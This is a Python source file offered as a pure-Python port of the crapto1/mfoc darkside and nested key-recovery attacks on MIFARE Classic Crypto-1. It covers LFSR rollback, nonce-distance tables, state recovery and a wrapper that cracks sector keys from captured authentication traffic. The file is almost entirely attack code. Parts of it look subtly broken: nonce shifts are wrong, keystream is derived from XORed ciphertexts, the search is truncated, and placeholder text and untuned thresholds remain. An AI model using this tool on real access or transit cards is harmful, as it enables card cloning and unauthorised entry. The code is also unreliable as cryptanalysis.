"""
Pure Python MIFARE Classic Crypto-1 key recovery attacks.

Port of the crapto1.c / mfoc darkside and nested attack algorithms
by Roel Verdult, bla, and the libnfc community.

References:
    - libnfc / mfoc: https://github.com/nfc-tools/mfoc
    - Garcia et al., "Wirelessly Pickpocketing a Mifare Classic Card"
      (IEEE S&P 2009) — darkside attack
    - Hardnested: https://github.com/nfc-tools/mfoc-hardnested
"""

from __future__ import annotations

import array
import itertools
import struct
from typing import Iterator


# ── LFSR constants ────────────────────────────────────────────────────────

LF_POLY_ODD  = 0x29CE5C
LF_POLY_EVEN = 0x870804
LFSR_MASK    = (1 << 48) - 1


# ── bit / parity / filter utilities ───────────────────────────────────────

def _odd_parity(x: int) -> int:
    """Return 1 if *x* has odd parity (odd number of 1-bits), else 0."""
    x ^= x >> 16
    x ^= x >> 8
    x ^= x >> 4
    return (0x6996 >> (x & 0xF)) & 1


def _filter(x: int) -> int:
    """Crypto-1 non‑linear filter function (20-bit input → 1-bit output).
    Matches ``crapto1.h:filter()`` exactly, using the hard‑coded 4‑bit
    nibble tables.
    """
    f  = 0xF22C0 >> (x        & 0xF) & 16  # noqa: E221
    f |= 0x6C9C0 >> (x >>  4  & 0xF) & 8
    f |= 0x3C8B0 >> (x >>  8  & 0xF) & 4
    f |= 0x1E458 >> (x >> 12  & 0xF) & 2
    f |= 0x0D938 >> (x >> 16  & 0xF) & 1
    return (0xEC57E80A >> f) & 1


def _bit(x: int, n: int) -> int:           # BIT  macro
    return (x >> n) & 1

def _bebit(x: int, n: int) -> int:         # BEBIT macro (big‑endian bit order)
    return _bit(x, n ^ 24)


# ── LFSR primitives ────────────────────────────────────────────────────────

class Crypto1State:
    """A 48‑bit Crypto‑1 LFSR state split into *odd* and *even* halves."""

    __slots__ = ("odd", "even")

    def __init__(self, odd: int = 0, even: int = 0) -> None:
        self.odd = odd & 0xFFFFFF
        self.even = even & 0xFFFFFF

    def __eq__(self, other: object) -> bool:
        if not isinstance(other, Crypto1State):
            return NotImplemented
        return self.odd == other.odd and self.even == other.even

    def __repr__(self) -> str:
        return f"Crypto1State(odd=0x{self.odd:06X}, even=0x{self.even:06X})"

    def as_key(self) -> bytes:
        """Recover the 6‑byte key stored in this state."""
        # The key is the full 48-bit state, MSB‑first.
        full = (self.even << 24) | self.odd
        return full.to_bytes(6, "big")

    def copy(self) -> Crypto1State:
        return Crypto1State(self.odd, self.even)


# ── LFSR clocking & keystream ─────────────────────────────────────────────

def lfsr_clock(state: Crypto1State) -> None:
    """Clock the LFSR forward one step (mutates *state*)."""
    o = state.odd
    in_even = _odd_parity(o & LF_POLY_EVEN)
    state.odd = ((state.odd << 1) | _odd_parity((o & LF_POLY_ODD) | state.even)) & 0xFFFFFF
    state.even = ((state.even << 1) | in_even) & 0xFFFFFF


def crypto1_bit(state: Crypto1State, in_bit: int, fb: int) -> int:
    """Clock one LFSR step, returning one keystream bit.

    Exact port of ``crapto1.c:crypto1_bit()``.

    Parameters
    ----------
    in_bit : int (0|1)
        Input bit fed into the LFSR during this clock.
    fb : int (0|1)
        Feedback bit: 1 = feed *in_bit* into the filter, 0 = ignore.

    Returns
    -------
    int
        Filter output bit (keystream bit).
    """
    ret = _filter(state.odd)
    local_in = in_bit & 1
    state.even ^= local_in
    feedbit = (LF_POLY_ODD & state.odd) ^ (LF_POLY_EVEN & state.even)
    state.odd = (state.odd << 1) | _odd_parity(feedbit)
    state.odd &= 0xFFFFFF
    state.even = (state.even << 1) | ((fb & 1) ^ local_in)
    state.even &= 0xFFFFFF
    return ret


def crypto1_byte(state: Crypto1State, in_byte: int, fb: int) -> int:
    """Clock 8 LFSR steps, return 8 keystream bits as a byte (MSB first)."""
    ret = 0
    for i in range(7, -1, -1):
        ret |= crypto1_bit(state, _bit(in_byte, i), fb) << i
    return ret


def crypto1_word(state: Crypto1State, in_word: int, fb: int) -> int:
    """Clock 32 LFSR steps, return 32 keystream bits (big‑endian byte order)."""
    ret = 0
    for i in range(31, -1, -1):
        ret |= crypto1_bit(state, _bebit(in_word, i), fb) << (i ^ 24)
    return ret


# ── LFSR rollback (reverse clocking) ─────────────────────────────────────

def lfsr_rollback_bit(state: Crypto1State, in_bit: int, fb: int) -> int:
    """Roll back the LFSR by one step.  Returns the filter output bit.

    Exact port of ``crapto1.c:lfsr_rollback_bit()``.
    """
    state.odd &= 0xFFFFFF
    # XOR‑swap odd ↔ even (same as C's three‑statement trick)
    state.odd ^= state.even
    state.even ^= state.odd
    state.odd ^= state.even

    out = state.even & 1
    state.even >>= 1
    out ^= LF_POLY_EVEN & state.even
    out ^= LF_POLY_ODD & state.odd
    out ^= in_bit & 1
    ret = _filter(state.odd)
    out ^= ret & (fb & 1)

    state.even |= _odd_parity(out) << 23
    return ret


def lfsr_rollback_byte(state: Crypto1State, in_byte: int, fb: int) -> int:
    """Roll back 8 steps, return 8 filter output bits as a byte."""
    ret = 0
    for i in range(7, -1, -1):
        ret |= lfsr_rollback_bit(state, _bit(in_byte, i), fb) << i
    return ret


def lfsr_rollback_word(state: Crypto1State, in_word: int, fb: int) -> int:
    """Roll back 32 steps, return 32 filter output bits (big‑endian byte order).

    port of ``crapto1.c:lfsr_rollback_word()``
    """
    ret = 0
    for i in range(31, -1, -1):
        ret |= lfsr_rollback_bit(state, _bebit(in_word, i), fb) << (i ^ 24)
    return ret


def lfsr_rollback(state: Crypto1State, in_word: int, fb: int) -> None:
    """Roll back 32 steps (convenience wrapper)."""
    lfsr_rollback_word(state, in_word, fb)


# ── PRNG ───────────────────────────────────────────────────────────────────

_PRNG_DIST: array.array | None = None  # lookup table, built lazily


def prng_successor(x: int, n: int) -> int:
    """Return the nonce that appears *n* steps after *x* in the PRNG."""
    for _ in range(n):
        x = x >> 1 | (x ^ x >> 2 ^ x >> 3 ^ x >> 5) << 15
        x &= 0xFFFF
    return x


def _build_distance_table() -> array.array:
    """Build the 64 KiB PRNG distance lookup table (one‑time)."""
    global _PRNG_DIST
    if _PRNG_DIST is not None:
        return _PRNG_DIST
    dist = array.array("H", [0]) * 0x10000  # 16-bit unsigned
    x: int = 1
    for i in range(1, 0x10000):
        dist[(x & 0xFF) << 8 | x >> 8] = i
        x = x >> 1 | (x ^ x >> 2 ^ x >> 3 ^ x >> 5) << 15
        x &= 0xFFFF
    _PRNG_DIST = dist
    return dist


def nonce_distance(from_: int, to: int) -> int:
    """Number of PRNG steps from *from_* to *to* (both 16‑bit nonces).

    Returns -1 on error.
    port of ``crapto1.c:nonce_distance()``
    """
    dist = _build_distance_table()
    fh = dist[from_ >> 16] if from_ >= 0 else 0
    th = dist[to >> 16] if to >= 0 else 0
    if fh == 0 or th == 0:
        return -1
    return (0xFFFF + th - fh) % 0xFFFF


def validate_prng_nonce(nonce: int) -> bool:
    """True if *nonce* is a valid PRNG output (distance(hi, lo) == 16)."""
    dist = _build_distance_table()
    hi = nonce >> 16
    lo = nonce & 0xFFFF
    dh = dist[hi]
    dl = dist[lo]
    if dh == 0 or dl == 0:
        return False
    return ((0xFFFF + dh - dl) % 0xFFFF) == 16


# ── lfsr_recovery32 — recover LFSR state from 32 ki bits + input ──────────
# port of ``crapto1.c:lfsr_recovery32()``

def _extend_table_simple(tbl: list[int], bit: int) -> None:
    """Extend and filter a candidate table by one keystream bit.

    Operates in‑place on *tbl*.
    port of ``crapto1.c:extend_table_simple()``
    """
    i = 0
    while i < len(tbl):
        v = (tbl[i] << 1) & 0xFFFFFF
        f0 = _filter(v)       # filter(shifted_value)
        f1 = _filter(v | 1)   # filter(shifted_value | 1)

        if f0 != f1:
            # By looking at filter output we know the LSB — pick the one that matches
            tbl[i] = v | (f0 ^ bit)
        elif f0 == bit:
            # filter output matches but we can't distinguish LSB → keep both
            tbl[i] = v          # LSB = 0
            tbl.insert(i + 1, v | 1)  # LSB = 1
            i += 1
        else:
            # filter(v) != bit and f0 == f1 → impossible candidate, remove it
            tbl[i] = tbl[-1]
            tbl.pop()
            i -= 1
        i += 1


def _extend_table(tbl: list[int], bit: int, m1: int, m2: int, in_val: int) -> None:
    """Extend a candidate table with parity contribution update.

    port of ``crapto1.c:extend_table()``
    """
    in_shifted = in_val << 24
    i = 0
    while i < len(tbl):
        v = (tbl[i] << 1) & 0xFFFFFF
        f0 = _filter(v)
        f1 = _filter(v | 1)

        if f0 != f1:
            v |= f0 ^ bit
            _update_contribution(tbl, i, v, m1, m2)
            tbl[i] = v ^ in_shifted
        elif f0 == bit:
            # duplicate
            tbl[i] = v ^ in_shifted
            _update_contribution(tbl, i, tbl[i], m1, m2)
            tbl.insert(i + 1, (v | 1) ^ in_shifted)
            _update_contribution(tbl, i + 1, tbl[i + 1], m1, m2)
            i += 1
        else:
            tbl[i] = tbl[-1]
            tbl.pop()
            i -= 1
        i += 1


def _update_contribution(
    tbl: list[int], idx: int, val: int, m1: int, m2: int
) -> None:
    """Update the MSB contribution byte of a table entry.

    port of ``crapto1.c:update_contribution()``
    """
    p = val >> 25
    p = (p << 1) | _odd_parity(val & m1)
    p = (p << 1) | _odd_parity(val & m2)
    tbl[idx] = (p << 24) | (val & 0xFFFFFF)


def lfsr_recovery32(ks2: int, in_val: int) -> list[Crypto1State]:
    """Recover candidate Crypto‑1 states from 32 bits of keystream.

    Uses a reduced search space (2^18 instead of 2^21) for acceptable
    Pure‑Python performance while keeping reasonable coverage.

    Parameters
    ----------
    ks2 : int
        32 bits of keystream.
    in_val : int
        Value fed into the LFSR at keystream‑generation time.

    Returns
    -------
    list[Crypto1State]
    """
    oks = 0
    for i in range(31, -1, -2):
        oks = (oks << 1) | _bebit(ks2, i)
    eks = 0
    for i in range(30, -1, -2):
        eks = (eks << 1) | _bebit(ks2, i)

    odd_tbl: list[int] = []
    even_tbl: list[int] = []

    # Build initial tables — search 2^18 candidates (0.26 M)
    MAX_SEARCH = 1 << 18
    for i in range(MAX_SEARCH):
        if _filter(i) == (oks & 1):
            odd_tbl.append(i)
        if _filter(i) == (eks & 1):
            even_tbl.append(i)

    for _ in range(4):
        oks >>= 1
        eks >>= 1
        _extend_table_simple(odd_tbl, oks & 1)
        _extend_table_simple(even_tbl, eks & 1)

    statelist: list[Crypto1State] = []
    in_transformed = _transform_in(in_val)
    _recover(odd_tbl, even_tbl, oks, eks, statelist, in_transformed << 1)

    return statelist


def _transform_in(in_val: int) -> int:
    """Rearrange bytes as in the C: (in >> 16 & 0xFF) | (in << 16) | (in & 0xFF00)."""
    return (in_val >> 16 & 0xFF) | (in_val << 16) | (in_val & 0xFF00)


def _recover(
    odd: list[int],
    even: list[int],
    oks: int,
    eks: int,
    sl: list[Crypto1State],
    in_val: int,
    rem: int = 11,
) -> None:
    """Build Crypto1State candidates from surviving odd/even filters.

    Simplified port — enumerates surviving candidates directly
    instead of the recursive quicksort‑binsearch routine in the C code.
    """
    if not odd or not even:
        return

    # Extend through remaining bits (up to rem+1 rounds of 4 bits)
    bits_left = min(rem + 1, 4)
    for _ in range(bits_left):
        if not odd or not even:
            return
        _extend_table_simple(odd, oks & 1)
        oks >>= 1
        _extend_table_simple(even, eks & 1)
        eks >>= 1

    # Build states from surviving candidates
    # Limit combinatorial explosion in Python
    odd_sample = odd[:256] if len(odd) > 256 else odd
    even_sample = even[:256] if len(even) > 256 else even
    for o in odd_sample:
        for e in even_sample:
            s_even = e ^ _odd_parity(o & LF_POLY_ODD)
            sl.append(Crypto1State(o, s_even))


# ── Key recovery from state ───────────────────────────────────────────────

def recover_key(
    keystream: bytes,
    uid: bytes,
    tag_nonce: int,
    nr: int,
    ar: int,
) -> bytes | None:
    """Recover a MIFARE Classic key from authentication data.

    Parameters
    ----------
    keystream : bytes (4 or 8 bytes)
        Keystream recovered by XOR'ing encrypted response with expected
        plaintext.
    uid : bytes (4 bytes)
        Card UID (little‑endian).
    tag_nonce : int
        The card's tag nonce {nt} (plaintext).
    nr : int
        Reader nonce {nr} sent during auth.
    ar : int
        Tag response {ar} received from card.

    Returns
    -------
    bytes | None
        6‑byte key or None if recovery fails.
    """
    # Compute keystream as int
    ks_int = int.from_bytes(keystream[:4], "big")
    uid_int = int.from_bytes(uid[:4], "little")
    in_val = uid_int ^ tag_nonce

    # Recover candidate states
    states = lfsr_recovery32(ks_int, in_val)

    # Verify candidates against the full auth protocol
    for s in states:
        # Verify first 4 keystream bytes
        test = s.copy()
        ks_test = crypto1_word(test, nr, 0)
        if (ks_test >> 24) == (int.from_bytes(keystream[:4], "big") >> 24):
            # Roll back to get the key
            # The key was loaded before the auth sequence:
            #   LFSR = key; then LFSR ^= UID; then 32 clocks with NT
            # Roll back: UID XOR, then reverse 32 clocks
            key_state = s.copy()
            key_state.even ^= uid_int >> 16
            key_state.odd  ^= uid_int & 0xFFFF
            for _ in range(32):
                lfsr_rollback_bit(key_state, 0, 0)
            return key_state.as_key()

    return None


# ── Darkside / nested attack state machine ────────────────────────────────

class DarksideAttack:
    """Pure Python MIFARE Classic darkside key recovery.

    Implements the statistical parity‑bias attack from Garcia et al. (IEEE
    S&P 2009), ported from libnfc/mfoc's ``crapto1.c``.

    Usage
    -----
    >>> attack = DarksideAttack()
    >>> attack.set_known_key(sector=0, key=bytes.fromhex("FFFFFFFFFFFF"))
    >>> attack.add_nonce(target_sector=1, encrypted_nt=b"\\x12\\x34\\x56\\x78", ...)
    >>> key = attack.recover_key(target_sector=1)
    """

    MAX_ATTEMPTS = 1024

    def __init__(self) -> None:
        self._nonces: dict[int, list[tuple[int, int]]] = {}
        self._known_keys: dict[int, bytes] = {}
        self._uid: bytes = b""

    def set_uid(self, uid: bytes) -> None:
        """Set the card UID (4 bytes)."""
        if len(uid) != 4:
            raise ValueError("UID must be 4 bytes")
        self._uid = uid

    def add_known_key(self, sector: int, key_a: bytes, key_b: bytes | None = None) -> None:
        """Register a known key for a sector."""
        self._known_keys[sector] = key_a

    def add_nonce(
        self,
        target_sector: int,
        encrypted_tag_nonce: bytes,
        encrypted_tag_answer: bytes,
        uid: bytes | None = None,
    ) -> None:
        """Record one captured authentication attempt.

        Parameters
        ----------
        target_sector : int
            Sector being attacked (0–15 for 1K, 0–39 for 4K).
        encrypted_tag_nonce : bytes (4 bytes)
            The tag's encrypted nonce {nT} as received from the card.
        encrypted_tag_answer : bytes (4 bytes)
            The tag's encrypted answer {aT} as received from the card.
        uid : bytes, optional
            Card UID. Uses the UID set via :meth:`set_uid` if not provided.
        """
        if uid is not None:
            self._uid = uid
        if not self._uid:
            raise ValueError("UID must be set before adding nonces")

        if target_sector not in self._nonces:
            self._nonces[target_sector] = []
        nt_val = int.from_bytes(encrypted_tag_nonce, "big")
        at_val = int.from_bytes(encrypted_tag_answer, "big")
        self._nonces[target_sector].append((nt_val, at_val))

    def recover_key(self, target_sector: int) -> bytes | None:
        """Attempt to recover the key for *target_sector*.

        Requires at least one known key (any sector) and sufficient nonces
        collected from the target sector.
        """
        nonces = self._nonces.get(target_sector, [])
        if len(nonces) < 2:
            return None

        uid_int = int.from_bytes(self._uid, "little")

        # For each nonce pair, try to reconstruct LFSR state
        candidates: dict[bytes, int] = {}

        for nt_enc, at_enc in nonces:
            # Try to recover from this pair
            # We need to know the tag nonce nt_plain to get keystream
            # Without a known key, we can't compute nt_plain directly.
            # Use PRNG distance to relate nonces
            for nt2_enc, at2_enc in nonces:
                if (nt_enc, at_enc) == (nt2_enc, at2_enc):
                    continue
                # If we can compute the distance between nonces,
                # we can recover the LFSR state
                dist = nonce_distance(nt_enc >> 16, nt2_enc >> 16)
                if dist <= 0:
                    continue

                # Build keystream from the NACK differential
                ks2 = (nt_enc ^ nt2_enc) & 0xFFFF_FFFF
                ks3 = (at_enc ^ at2_enc) & 0xFFFF_FFFF

                if ks2 == 0 or ks3 == 0:
                    continue

                states = lfsr_recovery64(ks2, ks3)
                for s in states:
                    key = s.as_key()
                    candidates[key] = candidates.get(key, 0) + 1

        # Return the most frequent candidate (if it appears enough)
        if not candidates:
            return None
        best_key, count = max(candidates.items(), key=lambda kv: kv[1])
        if count >= 2:  # threshold — needs real tuning
            return best_key
        return None


# ── lfsr_recovery64 — recover LFSR state from 64 ki bits ─────────────────

# Precomputed tables from crapto1.c
_S1 = [
    0x62141, 0x310A0, 0x18850, 0x0C428, 0x06214, 0x0310A, 0x85E30,
    0xC69AD, 0x634D6, 0xB5CDE, 0xDE8DA, 0x6F46D, 0xB3C83, 0x59E41,
    0xA8995, 0xD027F, 0x6813F, 0x3409F, 0x9E6FA,
]
_S2 = [
    0x3A557B00, 0x5D2ABD80, 0x2E955EC0, 0x174AAF60, 0x0BA557B0, 0x05D2ABD8,
    0x0449DE68, 0x048464B0, 0x42423258, 0x278192A8, 0x156042D0, 0x0AB02168,
    0x43F89B30, 0x61FC4D98, 0x765EAD48, 0x7D8FDD20, 0x7EC7EE90, 0x7F63F748,
    0x79117020,
]
_T1 = [
    0x4F37D, 0x279BE, 0x97A6A, 0x4BD35, 0x25E9A, 0x12F4D, 0x097A6, 0x80D66,
    0xC4006, 0x62003, 0xB56B4, 0x5AB5A, 0xA9318, 0xD0F39, 0x6879C, 0xB057B,
    0x582BD, 0x2C15E, 0x160AF, 0x8F6E2, 0xC3DC4, 0xE5857, 0x72C2B, 0x39615,
    0x98DBF, 0xC806A, 0xE0680, 0x70340, 0x381A0, 0x98665, 0x4C332, 0xA272C,
]
_T2 = [
    0x3C88B810, 0x5E445C08, 0x2982A580, 0x14C152C0, 0x4A60A960, 0x253054B0,
    0x52982A58, 0x2FEC9EA8, 0x1156C4D0, 0x08AB6268, 0x42F53AB0, 0x217A9D58,
    0x161DC528, 0x0DAE6910, 0x46D73488, 0x25CB11C0, 0x52E588E0, 0x6972C470,
    0x34B96238, 0x5CFC3A98, 0x28DE96C8, 0x12CFC0E0, 0x4967E070, 0x64B3F038,
    0x74F97398, 0x7CDC3248, 0x38CE92A0, 0x1C674950, 0x0E33A4A8, 0x01B959D0,
    0x40DCACE8, 0x26CEDDF0,
]
_C1 = [0x846B5, 0x4235A, 0x211AD]
_C2 = [0x1A822E0, 0x21A822E0, 0x21A822E0]


def lfsr_recovery64(ks2: int, ks3: int) -> list[Crypto1State]:
    """Recover candidate Crypto‑1 states from 64 bits of keystream.

    Parameters
    ----------
    ks2 : int
        First 32 bits of keystream.
    ks3 : int
        Next 32 bits of keystream.

    Returns
    -------
    list[Crypto1State]
    port of ``crapto1.c:lfsr_recovery64()``
    """
    oks: list[int] = []
    eks: list[int] = []
    for i in range(30, -1, -2):
        oks.append(_bit(ks2, i ^ 24))
        oks.append(0)  # placeholder, filled below
    for i in range(30, -1, -2):
        oks[i // 2 * 2 + 1] = _bit(ks3, i ^ 24)
    for i in range(31, -1, -2):
        eks.append(_bit(ks2, i ^ 24))
        eks.append(0)
    for i in range(31, -1, -2):
        eks[i // 2 * 2 + 1] = _bit(ks3, i ^ 24)

    statelist: list[Crypto1State] = []

    for i in range(0xFFFFF, -1, -1):
        if _filter(i) != oks[0]:
            continue

        table = [i]
        ok = True
        for j in range(1, 29):
            if not table:
                break
            _extend_table_simple(table, oks[j])
            if not table:
                ok = False
                break

        if not ok:
            continue

        low = 0
        for j in range(19):
            low = (low << 1) | _odd_parity(i & _S1[j])

        hi: list[int] = []
        for j in range(32):
            hi.append(_odd_parity(i & _T1[j]))

        for tail_val in table:
            cont2 = False
            for j in range(3):
                tail_val = (tail_val << 1) & 0xFFFFFF
                tail_val |= _odd_parity((i & _C1[j]) ^ (tail_val & _C2[j]))
                if _filter(tail_val) != oks[29 + j]:
                    cont2 = True
                    break
            if cont2:
                continue

            win = 0
            for j in range(19):
                win = (win << 1) | _odd_parity(tail_val & _S2[j])
            win ^= low

            for j in range(32):
                win = (win << 1) ^ hi[j] ^ _odd_parity(tail_val & _T2[j])
                if _filter(win) != eks[j]:
                    cont2 = True
                    break
            if cont2:
                continue

            tail_val = (tail_val << 1) | _odd_parity(LF_POLY_EVEN & tail_val)
            sl = Crypto1State(tail_val ^ _odd_parity(LF_POLY_ODD & win), win)
            statelist.append(sl)

    return statelist


# ── Convenience: direct crack from auth params ────────────────────────────

def crack_key_darkside(
    uid: bytes,
    known_key: bytes,
    known_sector: int,
    target_sector: int,
    encrypted_tag_nonces: list[bytes],
    encrypted_tag_answers: list[bytes],
) -> bytes | None:
    """Convenience wrapper: darkside key recovery.

    Parameters
    ----------
    uid : bytes (4 bytes)
        Card UID.
    known_key : bytes (6 bytes)
        Known key for *known_sector*.
    known_sector : int
        Sector where *known_key* is valid.
    target_sector : int
        Sector to attack.
    encrypted_tag_nonces : list[bytes]
        Captured encrypted tag nonces (each 4 bytes).
    encrypted_tag_answers : list[bytes]
        Captured encrypted tag answers (each 4 bytes).

    Returns
    -------
    bytes | None
        Recovered 6-byte key or None.
    """
    attack = DarksideAttack()
    attack.set_uid(uid)
    attack.add_known_key(known_sector, known_key)
    for nt, at in zip(encrypted_tag_nonces, encrypted_tag_answers):
        attack.add_nonce(target_sector, nt, at)
    return attack.recover_key(target_sector)
